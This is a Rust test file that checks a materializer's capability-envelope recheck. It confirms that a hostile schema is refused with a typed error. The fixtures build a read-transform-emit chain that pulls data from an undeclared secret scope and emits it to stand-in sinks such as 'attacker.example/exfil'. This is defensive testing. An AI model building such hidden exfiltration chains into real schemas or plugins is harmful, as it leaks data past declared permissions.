//! Phase-4-Foundation R5 G24-B-FP-1 — T1 LOAD-BEARING pin: hostile
//! schema READ+EMIT chain denied (subgraph injection via schema-
//! compiler-driven form generation).
//!
//! Pin source: `.addl/phase-4-foundation/r4-triage.md` §2 MAJOR row
//! r4-tc-5 + `.addl/phase-4-foundation/admin-ui-v0-threat-model.md` §T1
//! ("Subgraph injection via schema-compiler-driven form generation").
//! Closure-destination: `docs/future/phase-4-backlog.md §4.14`
//! (G24-A mini-review g24a-mr-1 BLOCKER).
//!
//! ## What this pin establishes
//!
//! Per threat-model §T1: schemas are typed-field-Node subgraphs that
//! materialize into UI forms. A hostile schema may attempt to embed
//! READ+EMIT chains that exfiltrate data the admin-UI-DID has access to
//! (e.g., a "Title" field whose form-load handler issues a READ for an
//! unrelated label, then EMITs the data to an attacker-controlled sink).
//!
//! Defense: schema compiler's cap-scope derivation MUST refuse any
//! schema whose READ+EMIT composition exceeds the schema's declared
//! `requires` envelope. Materializer entry refuses to walk a schema
//! whose runtime composition contains capabilities outside the
//! declared scope. The materializer's T1 envelope-recheck rule at
//! `crates/benten-platform-foundation/src/materializer.rs:884-904`
//! fires: any primitive carrying `cap_scope` outside `declared_requires`
//! returns `MaterializerError::SchemaMismatch { code:
//! ErrorCode::MaterializerSchemaMismatch }` BEFORE the walk reaches the
//! READ fanout or EMIT-to-sink boundary.
//!
//! ## Would-FAIL-if-no-op'd
//!
//! Implementer wires schema-compiler validation at COMPILE time only,
//! forgets to recheck at materializer-walk time. A schema passes
//! compile validation (declared `requires` is narrow), but at walk-
//! time, an inner subgraph EMIT-routes data outside the envelope.
//! Materializer happily walks the subgraph; data exfiltration succeeds.
//!
//! End-to-end LOAD-BEARING per threat-model §T1 test-pin plan +
//! Compromise #11 closure floor reaffirmation (sec-3.5-r1-13).

#![allow(clippy::unwrap_used)]

mod common;

use benten_core::{OperationNode, PrimitiveKind, Subgraph, Value};
use benten_errors::ErrorCode;
use benten_platform_foundation::{MaterializerError, SchemaSubgraphSpec, allow_all_cap_recheck};

use common::admin_ui_v0_harness::{AdminUiV0TestHarness, make_note_node};

/// Build a hostile [`SchemaSubgraphSpec`] whose runtime composition
/// includes a READ primitive bound to `hidden_read_scope` outside the
/// declared `requires` envelope + an EMIT primitive that would forward
/// the data to `hidden_emit_sink`. The full chain READ→TRANSFORM→EMIT
/// is wired by edges so the walker would surface the EMIT-to-sink at
/// runtime — but the materializer's T1 envelope-recheck refuses the
/// walk before it begins.
fn hostile_read_emit_chain_spec(
    schema_name: &str,
    hidden_read_scope: &str,
    hidden_emit_sink: &str,
) -> SchemaSubgraphSpec {
    let mut sg = Subgraph::new(format!("hostile_t1_{schema_name}"));
    // READ targeting a scope the admin-UI plugin should NOT be able to
    // touch under the declared narrow envelope. The materializer's
    // envelope-recheck loop iterates every primitive and refuses any
    // whose `cap_scope` property is outside `declared_requires`.
    sg.nodes.push(
        OperationNode::new("hostile_read", PrimitiveKind::Read)
            .with_property("cap_scope", Value::Text(hidden_read_scope.into())),
    );
    sg.nodes.push(OperationNode::new(
        "hostile_transform",
        PrimitiveKind::Transform,
    ));
    // EMIT primitive whose `emit_sink` would forward the READ output
    // off-process. The envelope-recheck halts the walk BEFORE the EMIT
    // fires; if the recheck were predicate-gated to a feature-flag or
    // skipped on a fast path, the chain would complete and data would
    // exfiltrate via `attacker_sink`.
    sg.nodes.push(
        OperationNode::new("hostile_emit", PrimitiveKind::Emit)
            .with_property("emit_sink", Value::Text(hidden_emit_sink.into())),
    );
    sg.edges.push((
        "hostile_read".into(),
        "hostile_transform".into(),
        "feeds".into(),
    ));
    sg.edges.push((
        "hostile_transform".into(),
        "hostile_emit".into(),
        "feeds".into(),
    ));
    SchemaSubgraphSpec::for_test_from_handcoded_subgraph(schema_name, sg)
}

#[test]
fn admin_ui_v0_hostile_schema_with_read_emit_chain_outside_envelope_denied() {
    // Substantive arm per pim-2 §3.6b — PRODUCTION-ARM (real Engine +
    // materializer walk through HarnessEngineAdapter + T1 envelope-
    // recheck rule), OBSERVABLE-CONSEQUENCE (typed MaterializerError
    // with E_MATERIALIZER_SCHEMA_MISMATCH + diagnostic naming the
    // hidden scope), WOULD-FAIL-IF-NO-OP'd (deleting the envelope-
    // recheck loop at materializer.rs:884-904 would let the walk
    // continue, returning Ok(MaterializerOutput) with rendered HTML).
    let harness = AdminUiV0TestHarness::new();

    // The legitimate content the admin-UI plugin can render — the
    // schema declares a narrow envelope around `read:innocent:body`.
    // Persist a Node to give the materializer a real content CID to
    // walk against.
    let content_cid = harness
        .create_test_node(&make_note_node("legit admin-ui content"))
        .unwrap();

    // ------------------------------------------------------------------
    // Construct the hostile schema — declared envelope is narrow
    // (`read:innocent:body`), but the runtime composition includes a
    // READ bound to a sensitive scope + an EMIT forwarding to an
    // attacker sink. The declared_requires vector below is the
    // envelope the schema's `requires` field would carry at the
    // manifest layer.
    // ------------------------------------------------------------------
    let hidden_read_scope = "read:secret-zone:high-value-data";
    let hidden_emit_sink = "attacker.example/exfil";
    let hostile_spec =
        hostile_read_emit_chain_spec("HostileT1Schema", hidden_read_scope, hidden_emit_sink);
    let declared_requires = vec!["read:innocent:body".to_string()];

    // ------------------------------------------------------------------
    // The defense fires — materializer's envelope-recheck rule at
    // materializer.rs:884-904 iterates every primitive in the spec.
    // The `hostile_read` Node's cap_scope is outside declared_requires,
    // so the walk surfaces SchemaMismatch BEFORE the READ fanout
    // executes + BEFORE the EMIT-to-sink fires.
    // ------------------------------------------------------------------
    let err = harness
        .render_admin_ui_with_envelope(
            &hostile_spec,
            content_cid,
            declared_requires.clone(),
            allow_all_cap_recheck(),
        )
        .expect_err(
            "T1 LOAD-BEARING: hostile schema with READ+EMIT chain \
             outside declared envelope MUST be REFUSED at materializer \
             entry — Compromise #11 closure floor + envelope-recheck",
        );

    // ------------------------------------------------------------------
    // Typed-code assertion: the rejection surfaces
    // E_MATERIALIZER_SCHEMA_MISMATCH (the materializer-side ErrorCode;
    // the upstream schema-compiler-side code is
    // E_SCHEMA_VOCAB_INVALID_LABEL / E_SCHEMA_VALIDATION_FAILED — but
    // this pin exercises the DEFENSE-IN-DEPTH materializer-entry arm
    // that fires even when the schema bypassed schema_compiler::compile
    // entirely, as a hand-coded SchemaSubgraphSpec). The substantive
    // contract: a typed denial, not a generic Backend / Other code.
    // ------------------------------------------------------------------
    match err {
        MaterializerError::SchemaMismatch {
            ref code,
            ref reason,
        } => {
            assert_eq!(*code, ErrorCode::MaterializerSchemaMismatch);
            // Defense-in-depth diagnostic: the rejection MUST name the
            // attempted scope for forensic visibility. The materializer
            // wraps the offending primitive's cap_scope in the reason
            // string — without it, an operator triaging an alert can't
            // tell WHICH primitive tripped the envelope-recheck.
            assert!(
                reason.contains(hidden_read_scope),
                "T1 defense-in-depth: rejection reason MUST name the \
                 attempted scope `{hidden_read_scope}` for forensic \
                 visibility — got: {reason}",
            );
            assert!(
                reason.contains("outside declared envelope"),
                "T1: diagnostic MUST identify the envelope-mismatch \
                 nature of the rejection — got: {reason}",
            );
        }
        other => panic!(
            "T1 LOAD-BEARING: hostile schema MUST surface typed \
             SchemaMismatch denial; got: {other:?}"
        ),
    }
    // Code-level second assertion via `MaterializerError::code()` to
    // pin the typed-code surface independent of the variant pattern
    // (the production-runtime arm that downstream callers — the napi
    // bridge + the renderer — consume).
    assert_eq!(err.code(), ErrorCode::MaterializerSchemaMismatch);
}

#[test]
fn admin_ui_v0_hostile_schema_distinct_emit_sink_does_not_change_outcome() {
    // Defense-in-depth boundary: changing the EMIT sink target does
    // NOT cause the envelope-recheck to miss the hostile READ —
    // the rule is keyed on the READ primitive's cap_scope, NOT on
    // the EMIT's sink string. A future regression that accidentally
    // narrowed the envelope check to "only primitives that include an
    // EMIT" would let `hidden_emit_sink` permutations bypass the
    // defense; this pin asserts that doesn't happen.
    let harness = AdminUiV0TestHarness::new();
    let content_cid = harness.create_test_node(&make_note_node("legit")).unwrap();

    let hostile_spec_a = hostile_read_emit_chain_spec(
        "HostileT1A",
        "read:secret-zone:variant-a",
        "attacker-a.example/exfil",
    );
    let hostile_spec_b = hostile_read_emit_chain_spec(
        "HostileT1B",
        "read:secret-zone:variant-b",
        "attacker-b.example/exfil",
    );

    let declared = vec!["read:innocent:body".to_string()];

    let err_a = harness
        .render_admin_ui_with_envelope(
            &hostile_spec_a,
            content_cid,
            declared.clone(),
            allow_all_cap_recheck(),
        )
        .expect_err("variant a refused");
    let err_b = harness
        .render_admin_ui_with_envelope(
            &hostile_spec_b,
            content_cid,
            declared,
            allow_all_cap_recheck(),
        )
        .expect_err("variant b refused");
    assert_eq!(err_a.code(), ErrorCode::MaterializerSchemaMismatch);
    assert_eq!(err_b.code(), ErrorCode::MaterializerSchemaMismatch);
}
